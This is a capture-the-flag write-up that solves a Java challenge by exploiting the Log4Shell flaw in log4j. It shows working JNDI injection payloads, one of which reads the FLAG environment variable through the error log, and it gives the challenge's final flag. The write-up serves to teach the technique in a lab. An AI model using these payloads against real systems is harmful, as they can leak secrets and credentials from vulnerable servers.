#### Log4Flag - Hard

*There is this program that is supposed to give me the flag. However, even if I beg for it and say the magic word, it won't return it. Try to lookup the flag.*

*You can test your solution locally. Connect to the server once it works to retrieve to flag:* <br>
*nc hostname 8082*

<br>

[Log4Flag.zip](../Public/Log4Flag.zip)

<br>

This is the response if we connect to the server:
```
$ nc hostname port
Do you want the flag?
yes
Try Harder! <3

Do you want the flag?
no
What are you even doing here? :P

Do you want the flag?
test 
Try a different input!

Do you want the flag?
...
```

Running the code locally with `run.sh` yields the same results. The response won't help us much for now. The `Log4Flag.zip` contains Java bytecode in the file `Log4Flag.class`. We can use `bytecode-viewer` or a website like [javadecompilers](http://www.javadecompilers.com/) to get the Java source code.

```java
import java.util.Scanner;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class Log4Flag {
    public static void main(String[] array) {
        try {
            final Logger logger = LogManager.getLogger("Log4Flag");

            while (true) {
                System.out.println("Do you want the flag?");
                String input = new Scanner(System.in).next();

                if (input.toLowerCase().contains("yes") && input.toLowerCase().contains("please")) {
                    System.out.println("I won't give you the flag this easily!");
                    logger.error("Unauthorized access attempt with input: {}", (Object) input);
                } else if (input.toLowerCase().contains("yes")) {
                    System.out.println("Try Harder! <3");
                } else if (input.toLowerCase().contains("please")) {
                    System.out.println("Getting closer!");
                } else if (input.toLowerCase().contains("no")) {
                    System.out.println("What are you even doing here? :P");
                } else {
                    System.out.println("Try a different input!");
                }
                System.out.println("");
            }
        } catch (Exception x) {
            System.err.println(x);
        }
    }
}
```
We can see that the code is using log4j. This should ring a bell about the zero day exploit in log4j that was published about a year ago [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228). Knowing this and looking at the challenge name, it is kind of obvious what we should do now. We need to use this vulnerability to find the flag.

We can also see that the logger is used if our input contains the words "yes" and "please". 
```bash
$ ./run.sh
Do you want the flag?
yesplease
I won't give you the flag this easily!
22:01:16.185 [main] ERROR Log4Flag - Unauthorized access attempt with input: yesplease
```

We can see that we now get a response from the logger as well. However, we haven't gotten the flag yet. We need to dig deeper.
We will start with a PoC to show that the vulnerability is present in the code:

```
$ ./run.sh 
Do you want the flag?
${jndi:ldap://127.0.0.1/test}yesplease
I won't give you the flag this easily!
2022-11-25 21:58:39,272 main WARN Error looking up JNDI resource [ldap://127.0.0.1/test]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
        at java.naming/com.sun.jndi.ldap.Connection.<init>(Connection.java:252)
        at java.naming/com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
        ...

21:58:39.179 [main] ERROR Log4Flag - Unauthorized access attempt with input: ${jndi:ldap://127.0.0.1/test}yesplease
```

The error messages proof that the vulnerability exists. The server tries to conntact a LDAP server and the connection gets refused. If we have a LDAP server, we could try to send request to it in order to create a reverse shell. This is not neccessary in this example. If we look at the `run.sh` script, we can see that the flag is saved in an environment variable called `FLAG`.
We can perform an environment lookup with log4j and retrieve the flag from the environment variables. 

```
$ ./run.sh     
Do you want the flag?
${jndi:ldap://127.0.0.1/${env:FLAG}}yesplease
I won't give you the flag this easily!
2022-11-25 22:10:38,008 main WARN Error looking up JNDI resource [ldap://127.0.0.1/nland{dummy-flag}]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
...

22:10:37.920 [main] ERROR Log4Flag - Unauthorized access attempt with input: ${jndi:ldap://127.0.0.1/${env:FLAG}}yesplease
```

We managed to exploit the code locally and to retrieve the dummy flag. It is contained in the exception log. Now we just have to execute the same payload on the server and we will be rewarded with the real flag. <br>
The flag is `nland{3nv1r0nm3n7_l00kup_&_m461c_w0rd_4_fl4g}`.
